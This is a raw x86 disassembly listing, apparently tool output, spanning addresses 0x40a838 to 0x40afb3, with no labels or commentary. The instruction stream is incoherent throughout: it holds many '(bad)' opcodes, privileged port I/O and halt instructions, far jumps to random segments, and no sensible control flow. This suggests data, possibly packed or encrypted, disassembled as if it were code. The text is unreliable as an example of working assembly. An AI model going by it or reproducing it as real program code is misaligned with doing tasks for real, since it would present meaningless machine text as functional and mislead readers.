  40a838:	call   0x98e09114
  40a83d:	sub    esp,DWORD PTR [edx+0x1b]
  40a840:	xor    BYTE PTR es:[ecx],dl
  40a843:	fadd   QWORD PTR [esi-0x2f3caec4]
  40a849:	push   eax
  40a84a:	and    BYTE PTR [ebx],0x57
  40a84d:	mov    edi,0x6299cc90
  40a852:	xor    ebp,DWORD PTR [edx-0x130fb03d]
  40a858:	lea    ebp,[ebx+0x9b7e49e]
  40a85e:	(bad)  
  40a85f:	enter  0x2135,0xa5
  40a863:	and    eax,0xcb42dc6
  40a868:	in     eax,0x4f
  40a86a:	dec    eax
  40a86b:	sub    BYTE PTR [edi+0x65],dh
  40a86e:	test   al,0xbe
  40a870:	sbb    esp,DWORD PTR [ebp+0x68]
  40a873:	xchg   esp,eax
  40a874:	pop    DWORD PTR [esi+0x77413f32]
  40a87a:	pushf  
  40a87b:	push   es
  40a87c:	jg     0x40a84a
  40a87e:	jae    0x40a8f4
  40a880:	or     DWORD PTR [ecx+0x63],ebx
  40a883:	mov    ebx,0x7e04c38d
  40a888:	fld    TBYTE PTR [esi+0x13229eb4]
  40a88e:	mov    fs,WORD PTR [esi-0x3]
  40a891:	mov    ah,0x33
  40a893:	pop    esi
  40a894:	scas   eax,DWORD PTR es:[edi]
  40a895:	inc    ecx
  40a896:	xchg   esp,eax
  40a897:	aad    0x90
  40a899:	pusha  
  40a89a:	pop    edi
  40a89b:	arpl   cx,di
  40a89d:	rcl    bl,0x53
  40a8a0:	dec    ecx
  40a8a1:	in     eax,dx
  40a8a2:	std    
  40a8a3:	sbb    bh,BYTE PTR [esp+ebx*4+0xaa0be57]
  40a8aa:	fdiv   QWORD PTR [ebp+eiz*4-0x13]
  40a8ae:	test   esp,eax
  40a8b0:	jne    0x40a927
  40a8b2:	aam    0x9c
  40a8b4:	hlt    
  40a8b5:	push   edi
  40a8b6:	leave  
  40a8b7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8b9:	(bad)  
  40a8ba:	jp     0x40a90d
  40a8bc:	adc    BYTE PTR [esi-0x3962439e],dh
  40a8c2:	in     eax,dx
  40a8c3:	nop
  40a8c4:	sbb    al,0xca
  40a8c6:	cmc    
  40a8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c8:	jmp    0x922c:0x8d89cbd3
  40a8cf:	test   DWORD PTR [esi],0x9d6f3509
  40a8d5:	in     eax,0x41
  40a8d7:	xchg   ebx,eax
  40a8d8:	jnp    0x40a909
  40a8da:	adc    al,0xaf
  40a8dc:	mov    eax,ds:0x13795049
  40a8e1:	add    BYTE PTR [ebp-0x3997c0e6],0xc9
  40a8e8:	xor    eax,0xaabaea08
  40a8ed:	mov    ecx,0xcc2887b6
  40a8f2:	xchg   ecx,eax
  40a8f3:	std    
  40a8f4:	pop    ecx
  40a8f5:	pop    edi
  40a8f6:	in     al,0x74
  40a8f8:	push   0x2a
  40a8fa:	scas   eax,DWORD PTR es:[edi]
  40a8fb:	push   ecx
  40a8fc:	xor    ax,0x3ae4
  40a900:	mov    edx,0xbb6b27d1
  40a905:	sbb    bl,BYTE PTR [esi]
  40a907:	out    0x47,eax
  40a909:	jecxz  0x40a8bc
  40a90b:	jo     0x40a8b1
  40a90d:	adc    ecx,0xbd7812db
  40a913:	fild   QWORD PTR [ebp+0x78e62515]
  40a919:	imul   edi,DWORD PTR [ebp-0xe],0x23
  40a91d:	int3   
  40a91e:	inc    ebp
  40a91f:	mov    BYTE PTR [ebx+0x4beb72c3],ah
  40a925:	not    DWORD PTR [esi+0x4fc00b8e]
  40a92b:	shr    DWORD PTR [eax+0x46],0x89
  40a92f:	jne    0x40a8da
  40a931:	mov    ebx,0xca49a4e5
  40a936:	lods   eax,DWORD PTR ds:[esi]
  40a937:	adc    ebp,DWORD PTR [edx-0x7b4047cf]
  40a93d:	cmp    al,0x5b
  40a93f:	sub    dl,dl
  40a941:	jne    0x40a966
  40a943:	mov    bl,0xd0
  40a945:	mov    eax,ds:0xcd484e7e
  40a94a:	sahf   
  40a94b:	dec    ebx
  40a94c:	jns    0x40a988
  40a94e:	jne    0x40a98d
  40a950:	and    edi,ebx
  40a952:	cmc    
  40a953:	add    bl,BYTE PTR [ecx-0x5c9adcfd]
  40a959:	lds    eax,FWORD PTR [esi]
  40a95b:	ins    DWORD PTR es:[edi],dx
  40a95c:	push   0xffffffc4
  40a95e:	mov    esi,0x129cd215
  40a963:	jo     0x40a923
  40a965:	sahf   
  40a966:	out    dx,al
  40a967:	pop    edx
  40a968:	push   ebp
  40a969:	push   edi
  40a96a:	mov    bh,0x9c
  40a96c:	jbe    0x40a9a8
  40a96e:	scas   al,BYTE PTR es:[edi]
  40a96f:	jmp    0xab82db9a
  40a974:	cmp    al,0x4f
  40a976:	les    edi,FWORD PTR [esi-0x316b2b8c]
  40a97c:	and    eax,0x5df637b8
  40a981:	inc    ecx
  40a982:	xor    al,0xff
  40a985:	pop    ebp
  40a986:	es mov ch,0x7a
  40a989:	mov    dl,dh
  40a98b:	repz mov ecx,0x6a9fdc03
  40a991:	pop    ds
  40a992:	fwait
  40a993:	inc    ebp
  40a994:	mov    edx,0xef9e11d2
  40a999:	mov    esi,DWORD PTR [eax+esi*2]
  40a99c:	cwde   
  40a99d:	fimul  DWORD PTR ds:0x3250405d
  40a9a3:	stos   DWORD PTR es:[edi],eax
  40a9a4:	push   edx
  40a9a5:	(bad)  [ecx-0x20]
  40a9a8:	(bad)  
  40a9a9:	jl     0x40a9b1
  40a9ab:	add    DWORD PTR [edx],esp
  40a9ad:	jecxz  0x40a943
  40a9af:	out    0xa8,eax
  40a9b1:	(bad)  
  40a9b2:	in     al,dx
  40a9b3:	jl     0x40a9b3
  40a9b5:	jo     0x40a9c2
  40a9b7:	aam    0xa1
  40a9b9:	push   edx
  40a9ba:	inc    ebp
  40a9bb:	push   ds
  40a9bc:	out    0xac,al
  40a9be:	mov    edx,0xaad50cc2
  40a9c3:	and    ecx,DWORD PTR [ebp-0x49]
  40a9c6:	xchg   edi,eax
  40a9c7:	cdq    
  40a9c8:	jp     0x40a981
  40a9ca:	jns    0x40aa33
  40a9cc:	loope  0x40a9ef
  40a9ce:	push   esp
  40a9cf:	fisub  DWORD PTR [ecx+0x60cee86e]
  40a9d5:	sub    al,0xd4
  40a9d7:	pop    ecx
  40a9d8:	mov    al,ds:0xedf0d21b
  40a9dd:	sahf   
  40a9de:	test   DWORD PTR [ebp+0x156b996a],ebx
  40a9e4:	js     0x40a986
  40a9e6:	cmp    BYTE PTR [edx],bl
  40a9e8:	mov    ds:0x3f23cd94,eax
  40a9ed:	mov    ah,dl
  40a9ef:	jecxz  0x40aa54
  40a9f1:	dec    ebp
  40a9f2:	pop    esp
  40a9f3:	xchg   esp,eax
  40a9f4:	daa    
  40a9f5:	pop    es
  40a9f6:	gs retf 
  40a9f8:	sbb    esi,DWORD PTR [esi]
  40a9fa:	mov    ah,0xcc
  40a9fc:	div    bl
  40a9fe:	pop    ds
  40a9ff:	es rcl edi,cl
  40aa02:	mov    al,0x70
  40aa04:	jnp    0x40a9db
  40aa06:	dec    BYTE PTR [esi+0x107c0b5d]
  40aa0c:	popf   
  40aa0d:	jo     0x40aa19
  40aa0f:	push   ss
  40aa10:	(bad)  
  40aa11:	out    dx,eax
  40aa12:	xchg   esi,eax
  40aa13:	push   ss
  40aa14:	out    dx,al
  40aa15:	jp     0x40aa20
  40aa17:	mov    dl,0xb1
  40aa19:	sbb    esp,esi
  40aa1b:	aas    
  40aa1c:	loop   0x40aa75
  40aa1e:	mov    ecx,0xcaa6935f
  40aa23:	and    DWORD PTR [ebp+edx*2-0x6c],esp
  40aa27:	sbb    bl,BYTE PTR [edi]
  40aa29:	es fwait
  40aa2b:	cld    
  40aa2c:	cmp    eax,0x14787d2a
  40aa31:	stos   BYTE PTR es:[edi],al
  40aa32:	ds sub al,0x61
  40aa35:	aas    
  40aa36:	push   ds
  40aa37:	cmp    BYTE PTR [edx+edi*2+0x558c5e4f],ah
  40aa3e:	fwait
  40aa3f:	repz mov dh,0xde
  40aa42:	outs   dx,DWORD PTR ds:[esi]
  40aa43:	jle    0x40aa43
  40aa45:	iret   
  40aa46:	mov    al,0x19
  40aa48:	ss retf 0xf00d
  40aa4c:	imul   eax,DWORD PTR ds:0x6be54904,0x216737dc
  40aa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa57:	ror    BYTE PTR ds:0x57f9d66f,cl
  40aa5d:	push   ecx
  40aa5e:	scas   eax,DWORD PTR es:[edi]
  40aa5f:	in     eax,dx
  40aa60:	rcl    bl,1
  40aa62:	xchg   ecx,eax
  40aa63:	sub    BYTE PTR [edi-0x80],ah
  40aa66:	sub    BYTE PTR [edi-0x8],0x47
  40aa6a:	mov    esi,0x8a09df18
  40aa6f:	push   ss
  40aa70:	repnz sbb BYTE PTR [esi+0x28],dh
  40aa74:	jmp    0xc72c:0xdf51e943
  40aa7b:	xor    al,ch
  40aa7d:	test   eax,0x2b884236
  40aa82:	pop    ds
  40aa83:	rcl    WORD PTR [ecx],cl
  40aa86:	cld    
  40aa87:	pop    esp
  40aa88:	iret   
  40aa89:	scas   al,BYTE PTR es:[edi]
  40aa8a:	mov    bh,0xa0
  40aa8c:	imul   DWORD PTR ds:0x3cd93b47
  40aa92:	in     eax,0xad
  40aa94:	add    DWORD PTR [ebx+0x3fadfd52],edi
  40aa9a:	dec    eax
  40aa9b:	xchg   edx,eax
  40aa9c:	out    0x45,eax
  40aa9e:	sahf   
  40aa9f:	in     al,0x1d
  40aaa1:	sbb    ebx,DWORD PTR [edx]
  40aaa3:	dec    esp
  40aaa4:	cli    
  40aaa5:	call   0xa2f:0x74a69396
  40aaac:	sti    
  40aaad:	jns    0x40aa3d
  40aaaf:	cli    
  40aab0:	cld    
  40aab1:	pusha  
  40aab2:	dec    esi
  40aab3:	imul   eax,DWORD PTR [edi-0x6c7256a7],0x44
  40aaba:	dec    ebx
  40aabb:	mov    BYTE PTR [edx+eiz*1+0x38b02058],al
  40aac2:	adc    eax,DWORD PTR [ecx+eax*2]
  40aac5:	loop   0x40aaf5
  40aac7:	pop    edx
  40aac8:	mov    al,ds:0x2870349
  40aacd:	(bad)  
  40aace:	ficomp DWORD PTR [eax+0x16f1a90]
  40aad4:	xor    eax,0xfab3bf31
  40aad9:	mov    ah,0x60
  40aadb:	sub    eax,0x52818d7f
  40aae0:	mov    BYTE PTR [ebx+0xf],dl
  40aae3:	sbb    bl,BYTE PTR [ebx-0x5b23de5b]
  40aae9:	cmp    eax,0x968fca93
  40aaee:	mov    edx,0x7e5f2bad
  40aaf3:	in     al,0x32
  40aaf5:	and    esi,0x91242883
  40aafb:	or     esi,DWORD PTR [ecx+0x30]
  40aafe:	loop   0x40ab3a
  40ab00:	sub    DWORD PTR [ebx+0x68bb7a00],edi
  40ab06:	outs   dx,DWORD PTR ds:[esi]
  40ab07:	inc    ecx
  40ab08:	hlt    
  40ab09:	add    ebx,DWORD PTR [ebp*4+0x76cdf405]
  40ab10:	aaa    
  40ab11:	fdivrp st(4),st
  40ab13:	(bad)  
  40ab14:	pop    esi
  40ab15:	popf   
  40ab16:	dec    edx
  40ab17:	mov    dh,0x96
  40ab19:	sar    DWORD PTR [eax+0x567184e7],cl
  40ab1f:	shr    DWORD PTR [bp+si],cl
  40ab22:	pop    esi
  40ab23:	dec    ecx
  40ab24:	sti    
  40ab25:	jnp    0x40ab18
  40ab27:	jb     0x40aba4
  40ab29:	aas    
  40ab2a:	mov    edx,0xf20eb462
  40ab2f:	outs   dx,DWORD PTR ds:[esi]
  40ab30:	mov    DWORD PTR [ecx-0x4724781b],eax
  40ab36:	jmp    0x40ab35
  40ab38:	add    al,0x8a
  40ab3a:	dec    edx
  40ab3b:	lock ret 0x30be
  40ab3f:	sbb    eax,0x3ec90074
  40ab44:	(bad)  
  40ab45:	push   ds
  40ab46:	jae    0x40ab67
  40ab48:	inc    ecx
  40ab49:	xchg   esp,eax
  40ab4a:	cdq    
  40ab4b:	dec    ebp
  40ab4c:	in     eax,dx
  40ab4d:	cmp    BYTE PTR [eax+0x4],dh
  40ab50:	ret    0xed25
  40ab53:	pusha  
  40ab54:	and    al,0x6f
  40ab56:	mov    bh,BYTE PTR [edi]
  40ab58:	iret   
  40ab59:	mov    ds:0xe9dfe1b0,al
  40ab5e:	jae    0x40ab0e
  40ab60:	jecxz  0x40ab36
  40ab62:	rcr    DWORD PTR [eax+0x34],1
  40ab65:	inc    ebp
  40ab66:	call   0x40d0c820
  40ab6b:	xchg   ebp,eax
  40ab6c:	dec    esi
  40ab6d:	jp     0x40abdd
  40ab6f:	aam    0x16
  40ab71:	cmp    eax,0x2be858bc
  40ab76:	pop    ecx
  40ab77:	xchg   esi,eax
  40ab78:	inc    eax
  40ab79:	cmp    dl,BYTE PTR [ecx]
  40ab7b:	ds push edi
  40ab7d:	sar    bl,0x26
  40ab80:	xchg   ecx,eax
  40ab81:	pop    ss
  40ab82:	adc    al,0x48
  40ab84:	data16 xor al,0x61
  40ab87:	fs mov ch,0xb5
  40ab8a:	ins    DWORD PTR es:[edi],dx
  40ab8b:	outs   dx,BYTE PTR ds:[esi]
  40ab8c:	ja     0x40ab20
  40ab8e:	clc    
  40ab8f:	xchg   DWORD PTR [edx+edi*8-0xa],ebx
  40ab93:	xchg   DWORD PTR [ecx+ebx*4-0x3d],esi
  40ab97:	add    esp,edi
  40ab99:	adc    eax,0x8d2fedee
  40ab9e:	push   ds
  40ab9f:	pop    ecx
  40aba0:	xor    BYTE PTR [ecx+0x72bcc37],ah
  40aba6:	mov    ds:0x5838e41,eax
  40abab:	or     dh,BYTE PTR [esi+0x25]
  40abae:	sub    bh,bh
  40abb0:	xchg   edx,eax
  40abb1:	mov    eax,ds:0xac971871
  40abb6:	icebp  
  40abb7:	mov    WORD PTR ds:0x83602381,ss
  40abbd:	(bad)  
  40abbe:	bound  eax,QWORD PTR [esi-0x992d138]
  40abc4:	(bad)  
  40abc5:	fwait
  40abc6:	add    bh,BYTE PTR [esi-0x7]
  40abc9:	sbb    BYTE PTR [ebx],cl
  40abcb:	or     ebx,DWORD PTR [ebx+eiz*4+0x7fea5c1d]
  40abd2:	jbe    0x40abd4
  40abd4:	or     al,0xf8
  40abd6:	adc    bl,BYTE PTR [edx+esi*8-0x18b117b4]
  40abdd:	cmc    
  40abde:	push   0xd8bc1ace
  40abe3:	scas   al,BYTE PTR es:[edi]
  40abe4:	jecxz  0x40aba1
  40abe6:	jmp    0x222b:0xf2ebf45d
  40abed:	or     BYTE PTR [ebx-0x63],bl
  40abf0:	or     al,0xdc
  40abf2:	(bad)  
  40abf3:	and    DWORD PTR [ebp-0x1a],ebx
  40abf6:	cdq    
  40abf7:	fwait
  40abf8:	xchg   edx,eax
  40abf9:	mov    edi,0xd4c72ac7
  40abfe:	ror    DWORD PTR [ebp-0x353b5819],0xd2
  40ac05:	rcr    BYTE PTR [edi],1
  40ac07:	js     0x40abc9
  40ac09:	sub    ebp,DWORD PTR [ebp-0xf8128dc]
  40ac0f:	jecxz  0x40abd5
  40ac11:	push   es
  40ac12:	cmp    BYTE PTR [ebx-0xf61edb],dh
  40ac18:	neg    BYTE PTR [eax+0x4bbe92ed]
  40ac1e:	adc    BYTE PTR [edi-0x3d7688cf],dl
  40ac24:	mov    WORD PTR [ebp+0x606a0008],?
  40ac2a:	rcl    DWORD PTR [eax-0x77d74a02],0x55
  40ac31:	icebp  
  40ac32:	(bad)  
  40ac34:	or     eax,0x6789d131
  40ac39:	sbb    al,0xb7
  40ac3b:	pop    ss
  40ac3c:	dec    ebp
  40ac3d:	lahf   
  40ac3e:	inc    ebp
  40ac3f:	repnz stos DWORD PTR es:[edi],eax
  40ac41:	scas   eax,DWORD PTR es:[edi]
  40ac42:	cmp    ah,BYTE PTR [eax-0x5af4b70d]
  40ac48:	call   0x5f08a3da
  40ac4d:	data16 cld 
  40ac4f:	sahf   
  40ac50:	add    BYTE PTR [esp+edi*1+0x6a2a040c],0xdc
  40ac58:	sbb    al,0x28
  40ac5a:	push   ecx
  40ac5b:	jl     0x40ac3b
  40ac5d:	test   eax,0xf07f3fa7
  40ac62:	test   al,0x38
  40ac64:	mov    ebx,0xfb39e81a
  40ac69:	stc    
  40ac6a:	call   0x4f72a89a
  40ac6f:	nop
  40ac70:	adc    ch,dl
  40ac72:	arpl   WORD PTR [ecx-0xe3779b5],di
  40ac78:	cmc    
  40ac79:	aas    
  40ac7a:	push   cs
  40ac7b:	jmp    0x2831e22c
  40ac80:	jge    0x40acfc
  40ac82:	add    eax,0xf2137194
  40ac87:	or     DWORD PTR [eax],eax
  40ac89:	and    eax,0xb5682bb9
  40ac8e:	xchg   dh,al
  40ac90:	pop    ebx
  40ac91:	ja     0x40ac1c
  40ac93:	repz and BYTE PTR [ebx+0x19],dh
  40ac97:	jl     0x40ac71
  40ac99:	scas   al,BYTE PTR es:[edi]
  40ac9a:	push   ebp
  40ac9b:	mov    cl,0xa0
  40ac9d:	cmc    
  40ac9e:	retf   0x48f2
  40aca1:	data16 xor cl,bh
  40aca4:	add    DWORD PTR [ecx+0x795423ba],0x7d
  40acab:	mov    eax,ds:0xce38e57a
  40acb0:	loop   0x40ac4e
  40acb2:	js     0x40acb3
  40acb4:	clc    
  40acb5:	aas    
  40acb6:	push   edi
  40acb7:	out    dx,eax
  40acb8:	loop   0x40ac4b
  40acba:	in     eax,dx
  40acbb:	lahf   
  40acbc:	or     eax,0x74ad7071
  40acc1:	out    dx,al
  40acc2:	rcr    ebp,0xa1
  40acc5:	ss mov esi,0xcc8fd8c7
  40accb:	jb     0x40ac83
  40accd:	ja     0x40ac4f
  40accf:	test   al,0x65
  40acd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd2:	aam    0x2d
  40acd4:	(bad)  
  40acd6:	jge    0x40ac82
  40acd8:	fs gs inc esi
  40acdb:	ins    DWORD PTR es:[edi],dx
  40acdc:	jmp    0xbb54:0x6e0695aa
  40ace3:	cli    
  40ace4:	add    ah,0x56
  40ace7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ace8:	mov    edx,0x9219d95e
  40aced:	aam    0x70
  40acef:	sbb    BYTE PTR [edi],0xae
  40acf2:	popf   
  40acf3:	test   BYTE PTR [ebx],bl
  40acf5:	jns    0x40ad30
  40acf7:	mov    esp,0x8aebcf5b
  40acfc:	in     eax,0xc
  40acfe:	jne    0x40ad10
  40ad00:	(bad)
  40ad03:	das    
  40ad04:	or     bh,BYTE PTR [ecx]
  40ad06:	xchg   ebx,eax
  40ad07:	or     BYTE PTR ds:0xa4c69566,ah
  40ad0d:	fwait
  40ad0e:	xor    edi,edx
  40ad10:	icebp  
  40ad11:	mov    es,WORD PTR [ebx]
  40ad13:	adc    eax,0xe615d2e3
  40ad18:	out    0xd1,al
  40ad1a:	cmp    DWORD PTR [edx],0xffffff87
  40ad1d:	push   esi
  40ad1e:	xchg   edi,eax
  40ad1f:	inc    ebx
  40ad20:	sbb    eax,0x49635579
  40ad25:	mov    bl,0x51
  40ad27:	divps  xmm6,XMMWORD PTR [ecx]
  40ad2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad2b:	pop    ecx
  40ad2c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ad2e:	loopne 0x40acdd
  40ad30:	jnp    0x40ad86
  40ad32:	xchg   BYTE PTR [esi-0x78],cl
  40ad35:	and    eax,eax
  40ad37:	test   BYTE PTR [ecx-0x76],dh
  40ad3a:	mov    dh,0x4
  40ad3c:	inc    ecx
  40ad3d:	cwde   
  40ad3e:	inc    esp
  40ad3f:	jae    0x40ad36
  40ad41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad42:	push   ebx
  40ad43:	out    0xe4,eax
  40ad45:	rol    BYTE PTR [edi+0x3055ea5b],cl
  40ad4b:	paddusw mm6,QWORD PTR [eax]
  40ad4e:	pushf  
  40ad4f:	xor    cl,bl
  40ad51:	sub    BYTE PTR [ecx],cl
  40ad53:	jnp    0x40ad45
  40ad55:	pop    ds
  40ad56:	leave  
  40ad57:	imul   edx,DWORD PTR [edi],0xffffff98
  40ad5a:	pop    ds
  40ad5b:	add    BYTE PTR [esi+edi*1],bh
  40ad5e:	in     al,dx
  40ad5f:	dec    ecx
  40ad60:	rol    DWORD PTR [edi+0x30473409],1
  40ad66:	ficomp DWORD PTR [esi-0x6585f8c2]
  40ad6c:	pop    esp
  40ad6d:	sub    BYTE PTR [edi+0x25ce1b44],dl
  40ad73:	xchg   ecx,eax
  40ad74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad75:	int3   
  40ad76:	dec    eax
  40ad77:	jp     0x40ad81
  40ad79:	mov    ds:0x31f51d39,al
  40ad7e:	fbld   TBYTE PTR [bp+di]
  40ad81:	sti    
  40ad82:	sbb    al,0xeb
  40ad84:	xchg   esp,eax
  40ad85:	sbb    DWORD PTR [bp+di+0x41],eax
  40ad89:	and    eax,0x5ff2ea9e
  40ad8e:	mov    esi,0x1a407ffb
  40ad93:	jge    0x40ad8c
  40ad95:	push   cs
  40ad96:	mov    DWORD PTR [eax+0x10],ecx
  40ad99:	mov    ss:0x6b69934c,eax
  40ad9f:	or     DWORD PTR [edx+0xe],0xd5da05f9
  40ada6:	lods   eax,DWORD PTR ds:[esi]
  40ada7:	jle    0x40ad2b
  40ada9:	stc    
  40adaa:	pop    esp
  40adab:	adc    eax,0xb80ef95f
  40adb0:	nop
  40adb1:	sbb    ah,BYTE PTR ds:0x90c75136
  40adb7:	inc    ebp
  40adb8:	push   es
  40adb9:	ror    BYTE PTR [edi],1
  40adbb:	nop    DWORD PTR [edi]
  40adbe:	push   ecx
  40adbf:	mov    BYTE PTR [ecx-0x726af2b],dl
  40adc5:	add    al,0x2b
  40adc7:	into   
  40adc8:	add    al,BYTE PTR [ecx+0x75b917e]
  40adce:	fldenv [ebx-0x45d2a46b]
  40add4:	pop    ds
  40add5:	and    BYTE PTR ss:[ebx+0x78],0x1e
  40adda:	lods   al,BYTE PTR ds:[esi]
  40addb:	and    bl,BYTE PTR [ebx+ebx*2]
  40adde:	cmp    dh,BYTE PTR [ebx-0x3867894c]
  40ade4:	push   0xa181841c
  40ade9:	mov    ah,BYTE PTR [bp+di+0x19]
  40aded:	jp     0x40ae59
  40adef:	jmp    0x40ae17
  40adf1:	add    DWORD PTR [edx+0x3a9ec0db],edx
  40adf7:	jbe    0x40ae1d
  40adf9:	xchg   BYTE PTR [ecx-0x2f],bh
  40adfc:	xchg   esi,eax
  40adfd:	push   ecx
  40adfe:	mov    ch,0x89
  40ae00:	hlt    
  40ae01:	lahf   
  40ae02:	mov    eax,0x97098040
  40ae07:	mov    bl,0x2
  40ae09:	xor    BYTE PTR [esi-0x5332477a],ah
  40ae0f:	daa    
  40ae10:	jmp    0x48b48444
  40ae15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae16:	ss sub eax,0xe7ec8ceb
  40ae1c:	jmp    0xf0:0xf5a4d71d
  40ae23:	add    DWORD PTR [ecx-0x2163162b],ebx
  40ae29:	mov    al,0xea
  40ae2b:	fwait
  40ae2c:	sar    DWORD PTR [edx],cl
  40ae2e:	sti    
  40ae2f:	pop    esi
  40ae30:	mov    dl,ah
  40ae32:	les    edi,FWORD PTR [ecx+0x4903d9c3]
  40ae38:	aas    
  40ae39:	xchg   esi,eax
  40ae3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae3b:	retf   
  40ae3c:	out    0x9d,al
  40ae3e:	nop
  40ae3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae40:	mov    eax,0x126b0840
  40ae45:	and    al,0xfc
  40ae47:	pop    eax
  40ae48:	test   DWORD PTR [edx+eax*2-0x7f],esp
  40ae4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae4d:	(bad)  
  40ae4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae50:	pop    ebp
  40ae51:	into   
  40ae52:	jle    0x40ade9
  40ae54:	lea    eax,[ebp-0x2]
  40ae57:	call   0x982:0xfe42d58b
  40ae5e:	cdq    
  40ae5f:	push   ss
  40ae60:	aam    0xf8
  40ae62:	xchg   ebp,eax
  40ae63:	jns    0x40aec5
  40ae65:	push   es
  40ae66:	sbb    ch,BYTE PTR [esi-0x5c]
  40ae69:	jg     0x40ae27
  40ae6b:	cwde   
  40ae6c:	cmp    bl,BYTE PTR [ebp+0x7f6b69a5]
  40ae72:	cdq    
  40ae73:	sub    BYTE PTR [edx+0x23da6079],dh
  40ae79:	adc    bh,dh
  40ae7b:	jne    0x40ae2b
  40ae7d:	fs push edi
  40ae7f:	outs   dx,BYTE PTR ds:[esi]
  40ae80:	adc    DWORD PTR [ebx+edx*4],edx
  40ae83:	aam    0x88
  40ae85:	add    dh,BYTE PTR [ecx+0x93a6100]
  40ae8b:	sbb    bl,BYTE PTR [ecx+0x44]
  40ae8e:	arpl   WORD PTR [edx+0x4f],sp
  40ae91:	sbb    DWORD PTR [ebp-0xa],ecx
  40ae94:	and    esp,edi
  40ae96:	sbb    DWORD PTR [ebx-0x3da537c3],ebx
  40ae9c:	jo     0x40ae38
  40ae9e:	jmp    0x24e4:0x83d6460a
  40aea5:	lock mov al,ds:0x283f893
  40aeab:	xor    cl,BYTE PTR [esi]
  40aead:	loopne 0x40af2b
  40aeaf:	mov    bl,0xe3
  40aeb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb2:	jl     0x40ae60
  40aeb4:	scas   eax,DWORD PTR es:[edi]
  40aeb5:	pop    ss
  40aeb6:	xchg   esi,eax
  40aeb7:	cmp    eax,0x6a4c54da
  40aebc:	out    dx,al
  40aebd:	cld    
  40aebe:	sub    al,0x80
  40aec0:	imul   eax,DWORD PTR [edx+0x65],0xffffff9a
  40aec4:	mov    ch,0xa1
  40aec6:	gs repnz ds (bad) 
  40aecc:	arpl   WORD PTR ds:0x1ff6a62b,di
  40aed2:	mov    eax,DWORD PTR [edi+ecx*1]
  40aed5:	and    al,0x17
  40aed7:	push   ds
  40aed8:	stc    
  40aed9:	fsubr  DWORD PTR [edi-0x5dbf4251]
  40aedf:	into   
  40aee0:	frstor [eax]
  40aee2:	and    BYTE PTR [eax],0x3e
  40aee5:	or     BYTE PTR [edx+ecx*2-0x6e],dl
  40aee9:	iret   
  40aeea:	loop   0x40ae88
  40aeec:	push   ss
  40aeed:	mov    dl,0xc0
  40aeef:	pop    ebp
  40aef0:	neg    BYTE PTR [ebx]
  40aef2:	gs fsubp st(6),st
  40aef5:	mov    bl,0x3a
  40aef7:	loope  0x40aed1
  40aef9:	fistp  DWORD PTR [edi+eiz*4-0x45ff4f60]
  40af00:	dec    esi
  40af01:	mov    al,0x24
  40af03:	pop    ecx
  40af04:	sbb    edi,DWORD PTR [esp+ecx*4-0x23]
  40af08:	inc    esp
  40af09:	mov    eax,0x1f9434f5
  40af0e:	mov    bh,dl
  40af10:	and    al,0x40
  40af12:	aad    0x22
  40af14:	jae    0x40af5d
  40af16:	push   ecx
  40af17:	ret    
  40af18:	xlat   BYTE PTR ds:[ebx]
  40af19:	(bad)  [edx+0x5c]
  40af1c:	popf   
  40af1d:	add    DWORD PTR [ecx+0x387b3a82],ecx
  40af23:	popf   
  40af24:	ret    0xec1a
  40af27:	xor    ecx,DWORD PTR [esi]
  40af29:	adc    DWORD PTR fs:[esi-0xf],ebp
  40af2d:	mov    ecx,DWORD PTR [eax]
  40af2f:	sub    eax,edx
  40af31:	(bad)  
  40af33:	cmp    eax,0xa5c0604f
  40af38:	aam    0x8a
  40af3a:	or     DWORD PTR [ecx+0x331a0e0],ebp
  40af40:	inc    edi
  40af41:	sbb    BYTE PTR [ebx],0x22
  40af44:	aam    0x5f
  40af46:	scas   eax,DWORD PTR es:[edi]
  40af47:	fbstp  TBYTE PTR [edi]
  40af49:	cwde   
  40af4a:	pop    eax
  40af4b:	mov    ebx,DWORD PTR [ebx]
  40af4d:	out    0x43,eax
  40af4f:	adc    eax,0xf4acb78a
  40af54:	push   ebx
  40af55:	aad    0x28
  40af57:	scas   eax,DWORD PTR es:[edi]
  40af58:	adc    eax,DWORD PTR [edx+0x33e08a9e]
  40af5e:	xor    al,0x39
  40af60:	mov    al,0xfe
  40af62:	aaa    
  40af63:	std    
  40af64:	int    0x78
  40af66:	sbb    BYTE PTR [esi],dh
  40af68:	outs   dx,BYTE PTR ds:[esi]
  40af69:	bound  edi,QWORD PTR [ebx-0x46]
  40af6c:	(bad)  
  40af6d:	jmp    0x3e0cdd7d
  40af72:	jle    0x40afeb
  40af74:	push   ebp
  40af75:	pushf  
  40af76:	push   ds
  40af77:	add    eax,0x626c0058
  40af7c:	or     ebp,ecx
  40af7e:	in     eax,dx
  40af7f:	jns    0x40af6d
  40af81:	mov    ds:0x82102c2a,al
  40af86:	sbb    DWORD PTR [ebp+ebx*2-0x6c],ecx
  40af8a:	outs   dx,BYTE PTR ds:[esi]
  40af8b:	scas   eax,DWORD PTR es:[edi]
  40af8c:	cmp    eax,0xf9f65518
  40af91:	ss jl  0x40b00c
  40af94:	jmp    0x40af61
  40af96:	xor    DWORD PTR [esi+0x15],edi
  40af99:	dec    eax
  40af9a:	fisub  WORD PTR [edi-0x157745cf]
  40afa0:	sbb    BYTE PTR [ebx+0x5f],al
  40afa3:	dec    ebx
  40afa4:	rcr    BYTE PTR [eax],0x9d
  40afa7:	std    
  40afa8:	ja     0x40af85
  40afaa:	in     eax,0xc7
  40afac:	or     BYTE PTR [ecx+0x4c],0x3c
  40afb0:	ret    0x2698
  40afb3:	(bad)  
